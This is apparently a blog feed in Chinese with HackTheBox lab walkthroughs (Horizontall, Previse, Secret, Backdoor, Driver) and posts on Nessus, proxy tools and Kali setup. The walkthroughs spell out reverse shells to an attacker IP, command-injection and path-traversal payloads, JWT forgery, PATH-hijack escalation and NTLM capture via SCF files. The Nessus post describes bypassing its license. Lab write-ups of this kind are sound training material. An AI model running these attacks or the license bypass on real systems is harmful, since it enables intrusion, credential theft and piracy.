        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>hostname：horizontall.htb</p><p>ip：10.10.11.105</p><p>os：linux</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.105</code></pre><pre class="language-none"><code class="language-none">Nmap scan report for 10.10.11.105Host is up (0.26s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open  http    nginx 1.14.0 (Ubuntu)|_http-methods: No Allow or Public header in OPTIONS response (status code 301)|_http-title: Did not follow redirect to http://horizontall.htb</code></pre><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><pre class="language-none"><code class="language-none">python3 dirsearch.py -u http://horizontall.htb/</code></pre><p><img src="/assets/image-20211227114624216.png" alt="image-20211227114624216"></p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><p>都没有发现什么可用的信息，尝试DNS爆破(虚拟主机爆破)</p><p>这里用到了新的fuzz工具 gobuster ：<a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a> ， 支持 vhost、dns、dir等类型</p><p>fuzz 目录</p><pre class="language-none"><code class="language-none">gobuster dir -u http://horizontall.htb/ -t 90 -w directory-list-2.3-medium.txt -e </code></pre><p><img src="/assets/image-20211228101747401.png" alt="image-20211228101747401"></p><p>Fuzz vhost</p><pre class="language-none"><code class="language-none">gobuster vhost -u http://Horizontall.htb -w subdomains-top1million-110000.txt -t 100</code></pre><p><img src="/assets/image-20211228105509822.png" alt="image-20211228105509822"></p><p>fuzz dns</p><pre class="language-none"><code class="language-none">gobuster dns -d mysite.com -t 50 -w common-names.txt -i</code></pre><p><img src="/assets/image-20211228101609163.png" alt="image-20211228101609163"></p><p>访问 <a href="http://api-prod.horizontall.htb/">http://api-prod.horizontall.htb/</a> 只有一个welcome</p><p><img src="/assets/image-20211228105648852.png" alt="image-20211228105648852"></p><p>fuzz 目录</p><pre class="language-none"><code class="language-none">gobuster dir -u http://api-prod.horizontall.htb/ -t 90 -w directory-list-2.3-medium.txt -e </code></pre><p><img src="/assets/image-20211228110012157.png" alt="image-20211228110012157"></p><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><h3 id="strapi-rce"><a href="#strapi-rce" class="headerlink" title="strapi rce"></a>strapi rce</h3><p>挨个访问上面扫描出的目录，发现一个 strapi cms ，在exploit-db搜索，发现有未授权rce可使用。  </p><p><a href="https://www.exploit-db.com/exploits/50239">https://www.exploit-db.com/exploits/50239</a></p><p>使用该rce为blind rce，测试发现可用</p><p><img src="/assets/image-20211228140851469.png" alt="image-20211228140851469"></p><p><img src="/assets/image-20211228140910291.png" alt="image-20211228140910291"></p><p>反弹shell</p><pre class="language-none"><code class="language-none">bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.52/5555 &lt;&amp;1'</code></pre><p><img src="/assets/image-20211228140959125.png" alt="image-20211228140959125"></p><p>拿到user flag</p><p><img src="/assets/image-20211228141037865.png" alt="image-20211228141037865"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>获取交互式shell</p><pre class="language-none"><code class="language-none">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>查看端口</p><pre class="language-none"><code class="language-none">ss -antp</code></pre><p><img src="/assets/image-20211228141745172.png" alt="image-20211228141745172"></p><p>80端口为 horizontall.htb ， 1337 端口 api-prod.horizontall.htb  8000端口 Laravel v8  3306为mysql</p><p>使用 LinEnum.sh 脚本收集信息并查看后，未发现可直接利用点。猜测通过 8000端口的服务，拿developer 权限</p><p>由于 端口监听在 127.0.0.1 ，此处使用 frp做端口映射</p><p>frpc.ini</p><pre class="language-none"><code class="language-none">common]server_addr = 10.10.14.52server_port = 7000[http]type = tcplocal_ip = 127.0.0.1local_port = 8000remote_port = 8080</code></pre><p>frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port = 7000</code></pre><p>服务端启动</p><pre class="language-none"><code class="language-none">./frps -c ./frps.ini</code></pre><p>客户端启动</p><pre class="language-none"><code class="language-none">./frpc -c ./frpc.ini</code></pre><p>启动成功后，访问vps的 8080 端口  （此处可通过 上传 ssh公钥，使用ssh本地转发实现）</p><pre class="language-none"><code class="language-none">ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105</code></pre><p><img src="/assets/image-20211228155029517.png" alt="image-20211228155029517"></p><p>exploit db上搜索，laravel8 debug rce 漏洞</p><p>使用<a href="https://github.com/LucifielHack/CVE-2021-3129_exploit">https://github.com/LucifielHack/CVE-2021-3129_exploit</a>  攻击larael服务</p><pre class="language-none"><code class="language-none">python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"</code></pre><p><img src="/assets/image-20211228173343669.png" alt="image-20211228173343669"></p><p>拿到 root.txt </p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Previse</title>
      <link href="/2021/12/27/hackthebox-previse/"/>
      <url>/2021/12/27/hackthebox-previse/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>hostname:Previse</p><p>IP:10.10.11.104</p><p>OS:linux</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 1000 10.10.11.104</code></pre><pre class="language-none"><code class="language-none">22/tcp open  ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-methods: No Allow or Public header in OPTIONS response (status code 302)| http-title: Previse Login|_Requested resource was login.php</code></pre><p>80端口是一个登陆页面， 目录扫描 未发现可用线索。</p><p>登陆账号输入 admin:admin 进入系统 （此处还有一个方法是 通过修改响应状态码，绕过权限校验，进入添加账号的界面）</p><p><img src="/assets/image-20211227092701943.png" alt="image-20211227092701943"></p><p>可以看见admin用户上传了一个siteBackup.zip，应该是网站备份，先下载下来。</p><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>logs.php 中含有系统 命令执行 方法，并且接收前端传入的参数</p><p><img src="/assets/image-20211227093152969.png" alt="image-20211227093152969"></p><p>构造payload  <code>|pwd &gt; /var/www/out.log</code></p><p><img src="/assets/image-20211227093828162.png" alt="image-20211227093828162"></p><p>反弹拿到权限</p><p><img src="/assets/image-20211227094630024.png" alt="image-20211227094630024"></p><p>获取交互式shell</p><pre class="language-none"><code class="language-none">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>但当前权限还无法读取 user.txt</p><pre class="language-none"><code class="language-none">-r-------- 1 m4lwhere m4lwhere 33 Dec 27 00:53 user.txt</code></pre><h3 id="hashcat破解密码"><a href="#hashcat破解密码" class="headerlink" title="hashcat破解密码"></a>hashcat破解密码</h3><p>结合刚才在源码中发现的mysql账号密码，登陆数据库查看</p><p><img src="/assets/image-20211227102113325.png" alt="image-20211227102113325"></p><p>发现这里有一个 m4lwhere 用户，尝试用hashcat爆破密码。</p><p>查看源码，其加密方式与linux shadow密码加密一致，构造下格式,写入 a.hash 文件</p><pre class="language-none"><code class="language-none">m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:18988:0:99999:7:::</code></pre><p>使用hashcat进行破解</p><pre class="language-none"><code class="language-none">hashcat -m 500 -a 0 a.hash rockyou.txt --self-test-disable</code></pre><p><img src="/assets/image-20211227110750901.png" alt="image-20211227110750901"></p><p>破解到密码  <code>ilovecody112235!</code> ，使用su切换身份，获取到user flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>sudo -l 收集到 用户可sudo执行一个脚本 /opt/scripts/access_backup.sh </p><p><img src="/assets/image-20211227112335761.png" alt="image-20211227112335761"></p><p>审计该脚本，由于 gzip没有写绝对路径，可使用环境变量提权法</p><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><pre class="language-bsh" data-language="bsh"><code class="language-bsh">echo "/bin/bash" &gt; /tmp/gzipchmod 777 /tmp/gzipecho $PATHexport PATH=/tmp:$PATHsudo /opt/scripts/access_backup.sh</code></pre><p><img src="/assets/image-20211227112630408.png" alt="image-20211227112630408"></p><p>或者直接在gzip 文件中写入反弹shell命令</p><pre class="language-none"><code class="language-none">bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.52/5555 &lt;&amp;1'sudo /opt/scripts/access_backup.sh</code></pre><p>即可接收到root权限的反弹shell</p><p><img src="/assets/image-20211227112853191.png" alt="image-20211227112853191"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Secret</title>
      <link href="/2021/12/26/hackthebox-secret/"/>
      <url>/2021/12/26/hackthebox-secret/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hostname:secret.htb</p><p>IP:10.10.11.120</p><p>Os:linux</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.120</code></pre><pre class="language-none"><code class="language-none">PORT      STATE    SERVICE VERSION22/tcp    open     ssh     (protocol 2.0)|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)80/tcp    open     http    nginx 1.18.0 (Ubuntu)|_http-methods: No Allow or Public header in OPTIONS response (status code 404)|_http-title: DUMB Docs3000/tcp  open     http    Node.js (Express middleware)|_http-methods: No Allow or Public header in OPTIONS response (status code 404)|_http-title: DUMB DocsNo exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>目录扫描，未发现比较有用的</p><p><img src="/assets/image-20211226235709626.png" alt="image-20211226235709626"></p><p>浏览发现可以下载项目源码</p><p><a href="http://10.10.11.120/download/files.zip">http://10.10.11.120/download/files.zip</a></p><h2 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h2><h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>对源码进行审计，发现 theadmin 账号可以调用 存在 任意命令执行的漏洞函数.</p><p><img src="/assets/image-20211227012159657.png" alt="image-20211227012159657"></p><p>因此 问题变成了如何获取 theadmin 的权限，此处考虑 jwt伪造。此处我们需要寻找 token值</p><h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>浏览文件，发现是一个git项目，使用git log 查看，发现一行注释</p><p><img src="/assets/image-20211227005715008.png" alt="image-20211227005715008"></p><p>直接在github上搜索该commit hash，找到源码</p><p><img src="/assets/image-20211227010038085.png" alt="image-20211227010038085"></p><p><img src="/assets/image-20211227010720056.png" alt="image-20211227010720056"></p><p>或者使用git 命令直接回到 之前版本</p><pre class="language-none"><code class="language-none">git reset --hard 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78</code></pre><p><img src="/assets/image-20211227010822443.png" alt="image-20211227010822443"></p><p>或者使用git 恢复 工具也可</p><h3 id="伪造token"><a href="#伪造token" class="headerlink" title="伪造token"></a>伪造token</h3><p>方法一：自己使用node 执行</p><pre class="language-none"><code class="language-none">const jwt = require("jsonwebtoken");s = "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"const token = jwt.sign({ _id: 123, name: "theadmin" , email: "test@test.com"}, s)console.log(token)</code></pre><p><img src="/assets/image-20211227011107024.png" alt="image-20211227011107024"></p><p>方法二：使用在线网站 解密测试</p><p><a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="/assets/image-20211227011908770.png" alt="image-20211227011908770"></p><p>随后利用 接口 /api/logs 执行命令测试</p><p><img src="/assets/image-20211227012745476.png" alt="image-20211227012745476"></p><p>读取user flag</p><pre class="language-none"><code class="language-none">http://10.10.11.120/api/logs?file=abcdef|cat ..\/user.txt</code></pre><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>通过上一步，直接反弹shell</p><pre class="language-none"><code class="language-none">http://10.10.11.120/api/logs?file=abcdef|bash%20-c%20'exec%20bash%20-i%20%26%3E/dev/tcp/10.10.14.52/5555%20%3C%261'</code></pre><p>模拟tty</p><pre class="language-none"><code class="language-none">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p>使用 LinEnum.sh 脚本枚举信息后，发现 /opt/count 文件较为可疑</p><p>后文为观看writeup后理解 </p><p>/opt/code.c 为 count 文件的源码，该文件可以root权限读取文件到内存，但正常情况我们无法看见。</p><p>但是代码中设置了 <code>prctl(PR_SET_DUMPABLE, 1);</code>，导致进程在崩溃时，会将内存dump出来(也就可以包含 /root/root.txt)</p><p>此处，我们需要准备两个shell，1个执行count </p><p><img src="/assets/image-20211227020705501.png" alt="image-20211227020705501"></p><p>另一个kill count进程</p><p><img src="/assets/image-20211227020730465.png" alt="image-20211227020730465"></p><p>查看 <code>/var/crash</code>文件夹，可以看到dump出来的内存信息</p><p><img src="/assets/image-20211227020849643.png" alt="image-20211227020849643"></p><p>解出crash 文件</p><pre class="language-none"><code class="language-none">apport-unpack _opt_count.1000.crash /tmp/test2</code></pre><p><img src="/assets/image-20211227021132360.png" alt="image-20211227021132360"></p><p>使用 strings 命令查看 CoreDump 文件，即可找到 root.txt 内容</p><p><img src="/assets/image-20211227021225849.png" alt="image-20211227021225849"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-backdoor</title>
      <link href="/2021/12/26/hackthebox-backdoor/"/>
      <url>/2021/12/26/hackthebox-backdoor/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hostname:backdoor.htb</p><p>IP:10.10.11.125</p><p>Os:linux</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre class="language-none"><code class="language-none">nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.125</code></pre><p>目标开放有：22  80  1337</p><p>其中 80端口为 WordPress  22 为ssh  1337 未知</p><p>使用WPScan对WordPress进行扫描，并查看漏洞，如可利用漏洞，枚举出一个admin用户</p><p><img src="/assets/image-20211226153404102.png" alt="image-20211226153404102"></p><p>使用目录扫描工具进行扫描,发现个别目录存在目录遍历问题</p><p><img src="/assets/image-20211226153930569.png" alt="image-20211226153930569"></p><h2 id="漏洞尝试"><a href="#漏洞尝试" class="headerlink" title="漏洞尝试"></a>漏洞尝试</h2><h3 id="WordPress插件漏洞"><a href="#WordPress插件漏洞" class="headerlink" title="WordPress插件漏洞"></a>WordPress插件漏洞</h3><p>其中 <a href="http://backdoor.htb/wp-content/plugins/">http://backdoor.htb/wp-content/plugins/</a> 中有一个插件，通过google搜索，发现存在目录穿越漏洞</p><p>payload：/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</p><p>使用读取到的数据库密码进行登录尝试失败，考虑到目标系统为linux，并且当前 1337 端口服务未知，使用 LFI 通过 proc 获取端口 1337 的信息。</p><pre class="language-none"><code class="language-none">/proc/$pid$/cmdline</code></pre><p><img src="/assets/image-20211226155332092.png" alt="image-20211226155332092"></p><p>此处剧透端口再 900-1000之间【没爆出来，后面登陆上后发现是 6889 】</p><p>1337 端口为 gdbserver ，存在 漏洞 <a href="https://www.exploit-db.com/exploits/50539">https://www.exploit-db.com/exploits/50539</a></p><h3 id="gdbserver漏洞利用"><a href="#gdbserver漏洞利用" class="headerlink" title="gdbserver漏洞利用"></a>gdbserver漏洞利用</h3><p>使用msfvenom 生成木马</p><pre class="language-none"><code class="language-none">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 PrependFork=true -o rev.bin</code></pre><p>nc监听该端口</p><pre class="language-none"><code class="language-none">nc -lvvp 4444</code></pre><p>使用exploit 进行攻击，多次尝试过成功获取反弹 shell</p><pre class="language-none"><code class="language-none">python3 50539.py 10.10.11.125:1337 rev.bin</code></pre><p><img src="/assets/image-20211226162056327.png" alt="image-20211226162056327"></p><p>查看用户权限为 user，拿到第一个flag</p><p><img src="/assets/image-20211226162139294.png" alt="image-20211226162139294"></p><p>使用 python获取交互式 shell</p><pre class="language-none"><code class="language-none">python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><p><img src="/assets/image-20211226164521955.png" alt="image-20211226164521955"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用 <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a> 枚举需要的信息</p><p>查找suid 应用</p><pre class="language-none"><code class="language-none">find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p>此处通过观察 ps -ef 命令可以发现，root 用户使用screen启动了 Session，因此通过以下命令，切换到 root下</p><pre class="language-none"><code class="language-none">export TERM=xtermscreen -x root/root</code></pre><p>获取到root shell</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nessus crack&amp;update</title>
      <link href="/2021/12/22/nessus-crack-update/"/>
      <url>/2021/12/22/nessus-crack-update/</url>
      
        <content type="html"><![CDATA[<h2 id="1-下载nessus安装包"><a href="#1-下载nessus安装包" class="headerlink" title="1.下载nessus安装包"></a>1.下载nessus安装包</h2><p>访问 <a href="https://www.tenable.com/downloads/nessus">https://www.tenable.com/downloads/nessus</a> 下载对应系统版本的nessus</p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p>本文以 ubuntu 18.04 为例：</p><pre class="language-none"><code class="language-none">dpkg -i nessus.deb</code></pre><p>启动 nessus</p><pre class="language-none"><code class="language-none">systemctl start nessusd</code></pre><p>访问 <a href="https://xxx.xx:8834/">https://xxx.xx:8834</a></p><p>选择 managed scanner</p><p><img src="/assets/image-20211222131635783.png" alt="image-20211222131635783"></p><p>选择Tenable.sc然后Continue</p><p><img src="/assets/image-20211222131708884.png" alt="image-20211222131708884"></p><p>设置nessus 账号和密码</p><h2 id="3-更新插件包"><a href="#3-更新插件包" class="headerlink" title="3.更新插件包"></a>3.更新插件包</h2><p>获取 challenge code</p><pre class="language-none"><code class="language-none">/opt/nessus/sbin/nessuscli fetch --challenge</code></pre><p>获取active code</p><p><a href="http://www.tenable.com/products/nessus-home">http://www.tenable.com/products/nessus-home</a></p><p>访问 <a href="https://plugins.nessus.org/offline.php">https://plugins.nessus.org/offline.php</a> ，输入 challenge code  和 active code</p><p>下载 all-2.0.tar.gz 和license ，并将license放置到对应</p><p><img src="/assets/image-20211222171648569.png" alt="image-20211222171648569"></p><p>使用nessus更新</p><pre class="language-none"><code class="language-none">./nessuscli update all.tar.gz</code></pre><p>重新打开即可，可见当前没有scan权限，只有setting选项：</p><p><img src="/assets/image-20211222131915515.png" alt="image-20211222131915515"></p><h2 id="4-PJ激活"><a href="#4-PJ激活" class="headerlink" title="4.PJ激活"></a>4.PJ激活</h2><p>停止 nessus服务</p><pre class="language-none"><code class="language-none">systemctl stop nessusd</code></pre><p>PLUGIN_SET 编号通过 上一步打开时进行获取</p><p>创建对应 plugin_feed_info.inc 文件</p><pre class="language-none"><code class="language-none">PLUGIN_SET = "202112201318";PLUGIN_FEED = "ProfessionalFeed (Direct)";PLUGIN_FEED_TRANSPORT = "Tenable Network Security Lightning"</code></pre><p>使用该文件替换原始文件</p><pre class="language-none"><code class="language-none">copy plugin_feed_info.inc -rf /opt/nessus/lib/nessus/plugins/ #第一次先不用拷贝到这copy plugin_feed_info.inc -rf /opt/nessus/var/nessus/</code></pre><p>启动 nessus </p><pre class="language-none"><code class="language-none">systemctl start nessusd</code></pre><p>查看是否有 scan 功能</p><p><img src="/assets/image-20211222173724388.png" alt="image-20211222173724388"></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理汇总</title>
      <link href="/2021/12/17/dai-li-gong-ju/"/>
      <url>/2021/12/17/dai-li-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>记录一下代理工具使用及常用命令</p><h2 id="EW"><a href="#EW" class="headerlink" title="EW"></a>EW</h2><p>简介：EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><h3 id="正向socks-v5隧道："><a href="#正向socks-v5隧道：" class="headerlink" title="正向socks v5隧道："></a>正向socks v5隧道：</h3><pre class="language-none"><code class="language-none">./ew -s ssocksd -l 1080</code></pre><h3 id="反向-socks-v5隧道："><a href="#反向-socks-v5隧道：" class="headerlink" title="反向 socks v5隧道："></a>反向 socks v5隧道：</h3><p>vps监听：8888端口由被控机连接，1080起socks 服务</p><pre class="language-none"><code class="language-none">./ew -s rcsocks -l 1080 -e 8888 </code></pre><p>目标主机执行：</p><pre class="language-none"><code class="language-none">./ew -s rssocks -d 1.1.1.1 -e 8888 </code></pre><p>更多级联参考官网：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Parallel 安装Kali记录</title>
      <link href="/2021/12/08/parallel-an-zhuang-kali-ji-lu/"/>
      <url>/2021/12/08/parallel-an-zhuang-kali-ji-lu/</url>
      
        <content type="html"><![CDATA[<h2 id="折腾原因"><a href="#折腾原因" class="headerlink" title="折腾原因"></a>折腾原因</h2><p>最近开始看HTB，发现很多都需要使用到kali里面的工具，于是在 安装 VMwareFusion 直接下载虚拟机镜像 和 使用 parallel 之间选择了通过 parallel安装(不想再装个VMwareFusion了😂)</p><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul><li><p>kali iso镜像：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p></li><li><p>parallel desktop</p></li></ul><h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3><p>选择 graph install</p><p><img src="/assets/image-20211208091120649.png" alt="image-20211208091120649"></p><p>其他没啥好说的，类似安装linux系统的步骤。</p><h3 id="安装-Parallels-tools"><a href="#安装-Parallels-tools" class="headerlink" title="安装 Parallels tools"></a>安装 Parallels tools</h3><p>点击右上角 安装 paralleltools 按钮，将会加载驱动盘 </p><p><img src="/assets/image-20211208094309859.png" alt="image-20211208094309859"></p><p>由于权限问题，需将文件复制出来进行安装</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#右键打开终端</span><span class="token function">mkdir</span> /root/pt<span class="token function">cp</span> -r /media/cdrom0 /root/pt<span class="token builtin class-name">cd</span> /root/pt./install.sh</code></pre><p><img src="/assets/image-20211208095355377.png" alt="image-20211208095355377"></p><p>出现报错，然后开始解决</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span>  /etc/apt/sources.listdeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali/ kali-rolling main contrib non-free<span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> libelf-dev<span class="token function">apt-get</span> <span class="token function">install</span> dkms<span class="token function">apt-get</span> <span class="token function">install</span> printer-driver-postscript-hp  <span class="token comment">#这个好像没成功，也没管</span></code></pre><p>开始解决 缺少 linux-headers 的问题</p><p>可以到 <a href="https://kali.download/kali/pool/main/l/linux/">https://kali.download/kali/pool/main/l/linux/</a> 下载对应版本</p><h3 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/ssh/sshd_config</code></pre><p><img src="/assets/image-20211208102727047.png" alt="image-20211208102727047"></p><p>保存退出，重启服务</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> restart <span class="token function">ssh</span> -antpupdate-rc.do <span class="token function">ssh</span> <span class="token builtin class-name">enable</span>   <span class="token comment">#开启开机自启</span></code></pre><p>使用 ssh登陆后，上传刚刚下载的三个文件，依次安装（视实际情况进行下载）</p><pre class="language-bash" data-language="bash"><code class="language-bash">dpkg -i linux-kbuild-5.10_5.10.46-4kali1_amd64.deb     dpkg -i linux-headers-5.10.0-kali9-common_5.10.46-4kali1_all.deb dpkg -i linux-headers-5.10.0-kali9-amd64_5.10.46-4kali1_amd64.deb</code></pre><p>安装完成后，重新执行 ./install 等待congratulation 提示，再重启即可</p><p>实现了复制粘贴及拖拽文件的功能XD</p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="ssh-远程端口转发"><a href="#ssh-远程端口转发" class="headerlink" title="ssh 远程端口转发"></a>ssh 远程端口转发</h4><pre class="language-none"><code class="language-none">ssh -f -N -R 445:10.211.55.5:445 xx.xx.xx.xx</code></pre><p>然而vps只能监听在 127.0.0.1 上,需要修改  <code>/etc/ssh/sshd_config</code> 文件中 <code>GatewayPorts</code> 为 yes</p><h4 id="frp端口转发"><a href="#frp端口转发" class="headerlink" title="frp端口转发"></a>frp端口转发</h4><p>Github地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><p>【占位】</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul><li><a href="https://www.cnblogs.com/artwalker/p/13235757.html">https://www.cnblogs.com/artwalker/p/13235757.html</a></li><li><a href="https://superuser.com/questions/1450567/ssh-tunnel-only-listens-on-127-0-0-1-on-remote-host">https://superuser.com/questions/1450567/ssh-tunnel-only-listens-on-127-0-0-1-on-remote-host</a></li><li><a href="https://www.cnblogs.com/xuanlvsec/p/13723495.html">https://www.cnblogs.com/xuanlvsec/p/13723495.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox-Dirver</title>
      <link href="/2021/12/07/hackthebox-dirver/"/>
      <url>/2021/12/07/hackthebox-dirver/</url>
      
        <content type="html"><![CDATA[<h2 id="初步尝试"><a href="#初步尝试" class="headerlink" title="初步尝试"></a>初步尝试</h2><p>访问 10.10.11.106 ，弹出 basic 认证界面，输入 admin:admin 可直接弱密码进入</p><p><img src="/assets/image-20211207212043408.png" alt="image-20211207212043408"></p><p>进入后只有一个页面固件上传页面是可用的，但不知道文件上传到哪了</p><p>使用nmap进行扫描，结果如下：</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap  -A -sV -sC -p- <span class="token number">10.10</span>.11.106</code></pre><p><img src="/assets/image-20211207212236347.png" alt="image-20211207212236347"></p><p>可以发现是开了  135  445  5985  端口</p><h2 id="学习知识"><a href="#学习知识" class="headerlink" title="学习知识"></a>学习知识</h2><p>通过 作弊 ，知道了SCF 文件攻击 这个术语</p><blockquote><p>SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，这并不是什么新鲜事。</p></blockquote><p>结合上面发现的文件上传点，我们知道会有人定时去查看该文件夹，也就是提示了可以触发SCF漏洞，这里有三种利用方式。</p><h3 id="通过NTLM捕获SMB攻击"><a href="#通过NTLM捕获SMB攻击" class="headerlink" title="通过NTLM捕获SMB攻击"></a>通过NTLM捕获SMB攻击</h3><p>一个 SCF 文件可以用来访问一个特定的 UNC 路径，允许渗透测试人员构建攻击。下面的代码可以被放置在一个文本文件，然后需要被植入到网络共享。</p><pre class="language-none"><code class="language-none">[Shell]Command=2IconFile=\\X.X.X.X\share\pentestlab.ico[Taskbar]Command=ToggleDesktop</code></pre><p>然后通过 responder 命令接收来自客户端的挑战</p><pre class="language-bash" data-language="bash"><code class="language-bash">responder -wrf -I eth0</code></pre><p>注：下图是存在问题的，抓到的NTLM存在问题，后来在kali上可正常运行</p><p><img src="/assets/image-20211207220539265.png" alt="image-20211207220539265"></p><p>或者使用 msf 的 <code>auxiliary/server/capture/smb</code> 模块接收(未成功)</p><h4 id="爆破-密码-hashcat"><a href="#爆破-密码-hashcat" class="headerlink" title="爆破 密码(hashcat)"></a>爆破 密码(hashcat)</h4><pre class="language-bash" data-language="bash"><code class="language-bash">hashcat -m <span class="token number">5600</span> hash.txt rockyou.txt --self-test-disable</code></pre><p>注：由于上面抓到的NTLMV2有问题，导致爆破存在问题，后来在kali上可正常运行</p><p><img src="/assets/image-20211207222632895.png" alt="image-20211207222632895"></p><h4 id="直接获取shell"><a href="#直接获取shell" class="headerlink" 